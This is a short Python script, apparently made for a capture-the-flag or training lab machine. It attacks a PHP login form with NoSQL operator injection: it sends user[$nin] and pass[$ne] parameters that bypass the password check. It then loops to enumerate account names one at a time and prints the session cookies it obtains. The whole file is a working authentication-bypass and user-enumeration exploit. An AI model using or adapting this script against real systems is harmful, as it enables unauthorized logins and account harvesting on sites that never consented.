import requests

IP = "10.10.215.101" # change IP here

url = "http://" + IP + "/login.php" 

# Initial list the a single user that not exists
# To get a new user to add to the list
#	  1. change the cookie PHPSESSID value according to the one printed on the console output
#	  2. visit URL http://<Lab IP>/sekr3tPl4ce.php to get the user's information
excluded_users = ["not-exists-user"]

# Dummy password
dummy_password = "blabla"

headers = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64)",
    "Content-Type": "application/x-www-form-urlencoded",
    "Referer": "http://" + IP + "/?err=1"
}

def build_payload(excluded):
    payload = {}
    for i, user in enumerate(excluded):
        payload[f"user[$nin][{i}]"] = user
    payload["pass[$ne]"] = dummy_password
    payload["remember"] = "yes"
    return payload

while True:
    data = build_payload(excluded_users)
    response = requests.post(url, data=data, headers=headers, allow_redirects=False)

    location = response.headers.get("Location", "")
    phpsessid = response.cookies.get("PHPSESSID", "")

    if response.status_code == 302 and location == "/sekr3tPl4ce.php":
        print(f"[+] New user found! Current excluded user's list: {excluded_users}")
        print(f"    Cookie PHPSESSID: {phpsessid}")
        nuovo = input("Insert new found user to update the list. Hit enter to exit: ").strip()
        if nuovo:
            excluded_users.append(nuovo)
        else:
            print("Finished")
            break
    else:
        print("[-] No user found.")
        break
